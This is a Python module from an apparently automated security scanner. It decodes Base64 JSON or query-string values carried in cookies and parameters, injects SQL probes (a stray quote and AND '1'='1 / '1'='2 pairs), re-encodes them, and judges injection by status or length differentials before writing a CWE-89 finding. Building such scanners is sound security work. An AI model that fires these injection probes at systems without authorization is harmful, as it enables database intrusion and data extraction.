"""Recursive encoded-parameter engine (CHAD/Gemini): a vulnerable input is often hidden behind a decode
layer — a Base64/Base64URL string that decodes to JSON/XML/query, carried in a COOKIE or query param,
whose inner fields are the real injection point (e.g. GinAndJuice's TrackingId cookie ->
base64({"type":..,"value":<SQLi>})). This engine decodes the layer, MUTATES an inner field with an
injection probe, RE-ENCODES in the same scheme, resends, and confirms by a request-level differential
(status/length change on the quote-injection, or a boolean true/false split). Target-agnostic and pure
where possible; the tool wrapper does the I/O.
"""
from __future__ import annotations

import base64
import json
from urllib.parse import parse_qsl, urlencode


def _b64_variants(v: str):
    """Yield (decoded_bytes, reencoder) for the base64 dialects a value might use."""
    for pad in (v, v + "=", v + "=="):
        for dec, enc in ((base64.b64decode, base64.b64encode), (base64.urlsafe_b64decode, base64.urlsafe_b64encode)):
            try:
                raw = dec(pad.encode(), validate=False) if dec is base64.b64decode else dec(pad.encode())
            except Exception:
                continue
            if raw and _mostly_printable(raw):
                yield raw, enc
                break


def _mostly_printable(b: bytes) -> bool:
    if len(b) < 2:
        return False
    ok = sum(1 for x in b[:64] if 9 <= x <= 126)
    return ok / min(len(b), 64) > 0.85


def unpack(value: str):
    """If `value` is base64 of a structured payload, return (kind, obj, reencode(obj)->str). kind is
    'json' | 'qs'. None if not a decodable structured layer. reencode round-trips through the SAME scheme."""
    for raw, enc in _b64_variants(str(value or "")):
        txt = raw.decode("utf-8", "replace").strip()
        if txt[:1] in ("{", "[") :
            try:
                obj = json.loads(txt)
            except Exception:
                continue
            if isinstance(obj, dict):
                return ("json", obj, lambda o, _enc=enc: _enc(json.dumps(o).encode()).decode().rstrip("="))
        elif "=" in txt and "&" in txt or ("=" in txt and " " not in txt and len(txt) < 200):
            try:
                pairs = parse_qsl(txt, keep_blank_values=True)
                if pairs:
                    obj = dict(pairs)
                    return ("qs", obj, lambda o, _enc=enc: _enc(urlencode(o).encode()).decode().rstrip("="))
            except Exception:
                continue
    return None


def string_fields(obj: dict) -> list:
    """Injectable string fields of a decoded object (top level)."""
    return [k for k, v in obj.items() if isinstance(v, str)]


# error/boolean injection probes applied to a decoded field
def probes(orig: str):
    return {
        "quote": orig + "'",                          # error-based: a stray quote breaks the query
        "true":  orig + "' AND '1'='1",
        "false": orig + "' AND '1'='2",
    }


def evaluate(baseline: dict, quote: dict, true_r: dict, false_r: dict) -> dict:
    """Given the response signals ({status,len}) for baseline + the three probes, decide if the decoded
    field is injectable. Returns {confirmed, oracle} — error differential OR boolean split, with the
    true-branch matching baseline and the false-branch diverging (the classic content-based SQLi tell)."""
    b, q, t, f = baseline, quote, true_r, false_r
    # error-based: the quote injection changes the status class (e.g. 200 -> 500) vs baseline
    if b.get("status") and q.get("status") and (b["status"] // 100) != (q["status"] // 100):
        return {"confirmed": True, "oracle": "error-based: quote injection changed HTTP status %s -> %s "
                "(the decoded field reaches a SQL query)" % (b["status"], q["status"])}
    # boolean-based: AND '1'='1 behaves like baseline, AND '1'='2 diverges (status or length)
    same = (t.get("status") == b.get("status")) and abs(t.get("len", 0) - b.get("len", 0)) < 50
    diff = (f.get("status") != b.get("status")) or abs(f.get("len", 0) - b.get("len", 0)) >= 50
    if same and diff:
        return {"confirmed": True, "oracle": "boolean-based: AND '1'='1' matched baseline "
                "(len %s) while AND '1'='2' diverged (len %s) — content-based SQLi in the decoded field"
                % (t.get("len"), f.get("len"))}
    return {"confirmed": False, "oracle": ""}


def finding(url: str, carrier: str, field: str, kind: str, oracle: str) -> dict:
    return {
        "title": "Base64-encoded parameter injection in %s field '%s'" % (carrier, field),
        "severity": "high", "family": "base64_param", "confidence": "confirmed", "target": url,
        "cwe": "CWE-89", "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", "cvss_score": 8.2,
        "evidence": "The %s carries a Base64-encoded %s payload; its '%s' field is injectable. %s" % (carrier, kind, field, oracle),
        "success_oracle": oracle,
        "reproduction_steps": ["Decode the Base64 %s value to %s" % (carrier, kind),
                               "Inject into the '%s' field, re-encode Base64, resend" % field,
                               "Observe the differential (%s)" % oracle[:60]],
        "impact": "SQL injection reachable only through a Base64/JSON decode layer — data extraction / auth bypass.",
        "remediation": "Parameterize queries over decoded values; treat decoded structured data as untrusted input.",
        "tags": ["base64", "encoded-param", "sqli", carrier.lower()],
    }
